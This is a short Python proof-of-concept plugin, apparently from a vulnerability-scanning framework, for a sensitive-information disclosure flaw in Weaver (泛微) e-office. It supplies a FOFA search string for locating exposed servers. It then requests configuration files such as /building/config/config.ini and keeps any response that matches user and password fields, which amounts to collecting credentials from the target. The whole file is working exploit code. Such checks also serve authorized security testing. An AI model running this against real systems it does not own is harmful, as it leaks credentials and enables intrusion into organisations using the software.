#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/uShIhkrg4mjJOAlyA17KTw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '泛微e-office系统敏感信息泄露-2',

      'level'     :   'high',

      'FOFA'      :   'app="泛微-EOffice"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/21',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini','/building/config/config.ini']
  url1 = url + targets[0]
  url2 = url + targets[1]
  ret['url'] = url2
  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'building.*?user.*?password.*?imtype.*?imoatosms',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret